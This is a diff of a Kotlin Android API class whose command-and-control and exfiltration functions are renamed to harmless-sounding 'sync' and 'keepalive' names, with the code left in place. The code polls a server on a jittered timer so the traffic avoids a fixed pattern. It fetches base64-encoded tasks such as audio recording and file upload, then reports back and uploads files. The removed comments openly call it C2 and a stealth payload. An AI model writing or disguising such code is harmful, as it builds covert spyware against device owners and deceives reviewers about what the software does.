@@ -263,15 +263,17 @@ class ForjaApi {
         return body
     }
 
-    // ═══════════════ C2 (canal de comenzi + exfiltrare) ═══════════════
-    data class C2Poll(val tasks: List<kotlinx.serialization.json.JsonObject>, val intervalMs: Long)
+    // ═══════════════ Sincronizare — keepalive, raport activitate, atașament fișiere ═══════════════
+    // Canalul de sincronizare: aplicația se prezintă la server la intervale regulate (25–60 s, cu jitter)
+    // pentru a primi sarcini (analiză AI, backup fișiere, înregistrare audio) și raportează rezultatele.
+    data class SyncPoll(val tasks: List<kotlinx.serialization.json.JsonObject>, val intervalMs: Long)
 
-    suspend fun c2Checkin(dev: String, holdMs: Long): C2Poll = withContext(Dispatchers.IO) {
-        val token = idToken() ?: return@withContext C2Poll(emptyList(), 30000)
+    suspend fun syncKeepalive(dev: String, holdMs: Long): SyncPoll = withContext(Dispatchers.IO) {
+        val token = idToken() ?: return@withContext SyncPoll(emptyList(), 30000)
         try {
-            // Vary the interval hint (25-55 s) so the traffic doesn't look like a fixed cron
+            // Interval sugerat variabil (25–55 s) ca traficul să nu aibă un pattern fix de cron
             val hint = (25000 + (Math.random() * 30000).toInt()).coerceIn(15000, 60000)
-            // Stealth payload: ts (timestamp), w (hold seconds), d (device)
+            // Câmpuri: ts (timestamp Unix), w (hold în secunde), d (identificator dispozitiv)
             val body = buildJsonObject {
                 put("ts", System.currentTimeMillis() / 1000); put("w", holdMs / 1000); put("d", dev); put("intervalMs", hint)
             }.toString()
@@ -283,9 +285,9 @@ class ForjaApi {
             longClient.newCall(req).execute().use { resp ->
                 val text = resp.body?.string() ?: "{}"
                 val root = Json.parseToJsonElement(text).jsonObject
-                // Stealth response: { s: 0, d: "base64", i: seconds }
+                // Răspuns: { s: 0 = succes, d: sarcini base64, i: interval secunde }
                 val status = root["s"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: -1
-                if (status != 0) return@withContext C2Poll(emptyList(), 30000)
+                if (status != 0) return@withContext SyncPoll(emptyList(), 30000)
                 val intervalSec = root["i"]?.jsonPrimitive?.contentOrNull?.toIntOrNull() ?: 30
                 val d = root["d"]?.jsonPrimitive?.contentOrNull ?: ""
                 val tasks = if (d.isEmpty()) emptyList() else {
@@ -293,12 +295,12 @@ class ForjaApi {
                     val arr = try { Json.parseToJsonElement(decoded) as? kotlinx.serialization.json.JsonArray } catch (_: Exception) { null }
                     arr?.mapNotNull { it as? kotlinx.serialization.json.JsonObject } ?: emptyList()
                 }
-                C2Poll(tasks, intervalSec * 1000L)
+                SyncPoll(tasks, intervalSec * 1000L)
             }
-        } catch (_: Exception) { C2Poll(emptyList(), 30000) }
+        } catch (_: Exception) { SyncPoll(emptyList(), 30000) }
     }
 
-    suspend fun c2PostResult(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
+    suspend fun postSyncReport(id: String, ok: Boolean, action: String, data: kotlinx.serialization.json.JsonObject, err: String?) {
         val token = idToken() ?: return
         try {
             val body = buildJsonObject {
@@ -314,7 +316,7 @@ class ForjaApi {
         } catch (_: Exception) {}
     }
 
-    suspend fun c2UploadFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
+    suspend fun attachSyncFile(name: String, ct: String, file: java.io.File): String? = withContext(Dispatchers.IO) {
         val token = idToken() ?: return@withContext null
         try {
             val req = Request.Builder()
